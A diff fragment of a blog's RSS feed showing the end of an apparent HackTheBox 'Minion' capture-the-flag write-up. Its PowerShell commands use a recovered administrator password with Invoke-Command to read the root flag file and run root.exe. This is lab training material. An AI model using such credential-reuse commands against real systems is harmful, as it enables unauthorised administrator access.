+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1234test'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ConvertTo-SecureString&lt;/span&gt; -AsPlainText &lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt; -Force; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Management.Automation.PSCredential &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;; Invoke-Command -ComputerName localhost -credential &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; -ScriptBlock &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;\users\administrator\desktop\root.txt &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;In &lt;/span&gt;order to get the flag you have to launch root.exe located &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this folder!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Ok, so I then ran the root.exe executable:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1234test'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ConvertTo-SecureString&lt;/span&gt; -AsPlainText &lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt; -Force; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Management.Automation.PSCredential &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;; Invoke-Command -ComputerName localhost -credential &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; -ScriptBlock &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; \users\administrator\desktop\root.exe &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+Are you trying to cheat me?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Sounded like I would need an extra step. I then remembered about the output of secret.exe that was giving me the current working directory, so I thought if that could be the problem. I changed the command to be in the same directory as root.exe:&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Note: The .\ is important.&lt;/b&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'administrator'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1234test'&lt;/span&gt;; &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ConvertTo-SecureString&lt;/span&gt; -AsPlainText &lt;span class=&quot;nv&quot;&gt;$Password&lt;/span&gt; -Force; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Management.Automation.PSCredential &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;; Invoke-Command -ComputerName localhost -credential &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; -ScriptBlock &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set-location&lt;/span&gt; \users\administrator\desktop\; .\root.exe &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;With this I got the root flag. The End.&lt;/p&gt;
+</description>
+        <pubDate>Wed, 21 Mar 2018 11:35:00 -0700</pubDate>
+        <link>http://localhost:4000/pentesting/ctf/2018/03/21/HackTheBox-Minion.html</link>
+        <guid isPermaLink="true">http://localhost:4000/pentesting/ctf/2018/03/21/HackTheBox-Minion.html</guid>
+        
+        
+        <category>Pentesting</category>
+        
+        <category>CTF</category>
+        
+      </item>
     
       <item>
         <title>HackTheBox - Kotarak</title>
